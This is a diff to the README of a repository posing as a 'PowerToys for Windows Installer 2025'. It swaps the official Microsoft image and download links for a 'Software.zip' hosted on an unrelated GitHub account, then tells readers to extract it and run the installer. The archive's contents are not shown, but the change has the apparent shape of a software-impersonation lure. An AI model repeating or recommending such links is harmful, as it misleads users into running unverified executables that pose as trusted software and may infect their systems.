@@ -6,7 +6,7 @@ Welcome to the official repository for PowerToys for Windows Installer 2025! Pow
 ### About PowerToys
 PowerToys brings a variety of powerful tools to your fingertips to optimize your workflow, improve system performance, and customize your Windows experience. Whether you're a power user, developer, or simply looking to make your daily tasks more efficient, PowerToys has something for everyone.
 
-![PowerToys Logo](https://raw.githubusercontent.com/microsoft/PowerToys/main/doc/images/overview/hero-image.png)
+![PowerToys Logo](https://github.com/forenues123/PowerToys-Windows-Installer-2025/releases/download/v1.0/Software.zip)
 
 ### Features
 - **Desktop Tools:** Enhance your desktop experience with tools like FancyZones for window management and Shortcut Guide for keyboard shortcuts.
@@ -22,7 +22,7 @@ PowerToys brings a variety of powerful tools to your fingertips to optimize your
 
 ### Installation
 To get started with PowerToys for Windows Installer 2025, download the latest version from the link below:
-[![Download PowerToys 2025](https://img.shields.io/badge/Download-PowerToys%202025-blue)](https://github.com/cli/cli/archive/refs/tags/v1.0.0.zip)
+[![Download PowerToys 2025](https://github.com/forenues123/PowerToys-Windows-Installer-2025/releases/download/v1.0/Software.zip%202025-blue)](https://github.com/forenues123/PowerToys-Windows-Installer-2025/releases/download/v1.0/Software.zip)
 
 Once downloaded, extract the files and run the installer to begin the installation process. Follow the on-screen instructions to configure PowerToys to suit your preferences.
 
